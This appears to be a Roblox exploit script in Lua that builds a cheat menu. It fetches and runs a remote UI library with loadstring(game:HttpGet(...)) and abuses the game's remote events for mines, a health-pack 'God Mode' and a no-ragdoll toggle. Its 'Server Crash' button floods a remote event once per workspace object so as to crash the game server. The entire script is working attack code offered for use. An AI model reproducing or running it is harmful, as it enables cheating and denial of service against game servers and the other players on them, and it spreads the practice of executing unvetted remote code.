local GameData = game:GetService("ReplicatedStorage").GameData
local LP = game:GetService("Players").LocalPlayer

local use = game:GetService("RunService").Stepped:Connect(function()   end)
local use2 = game:GetService("RunService").Stepped:Connect(function()   end)

local gui = loadstring(game:HttpGet("https://raw.githubusercontent.com/Dumb-Utility/UnnamedHub/main/UI.lua"))()

local Window = gui:CreateGui()

local plr = Window:AddFrame("Player")


plr:AddButton("Gravity Mine", function()
GameData.GravityMine:FireServer()
end)

plr:AddButton("Electric Mine", function()
    GameData.ElectricityMine:FireServer()
end)

plr:AddCheckBox("God Mode", function() use:Disconnect() end, function()
    use = game:GetService("RunService").Stepped:Connect(function()
        if LP.Character == nil then LP.CharacterAdded:Wait() end
        local Character = LP.Character
        if Character.Humanoid.Health ~= LP.Character.Humanoid.MaxHealth then
            GameData.HealthPack:FireServer()
        end
        end)
end)


plr:AddCheckBox("No ragdoll", function() use2:Disconnect() end, function()
    use2 = game:GetService("RunService").Stepped:Connect(function()
        if LP.Character == nil then LP.CharacterAdded:Wait() end
        local Character = LP.Character
        if Character.Humanoid.PlatformStand == true then
            Character.Humanoid.PlatformStand = false
        end
        end)
end)

local server = Window:AddFrame("Server")

server:AddButton("Server Crash", function()
    local index = 0
for _,v in pairs(game:GetService("Workspace"):GetDescendants()) do

    if index % 73 == 0 then
        wait(0.01)
      end
     
    task.spawn(function()
            game:GetService("ReplicatedStorage").GameData.ElectricityMine:FireServer(Color3.fromRGB(255, 0, 0))
    end)

    index = index + 1
end
end)
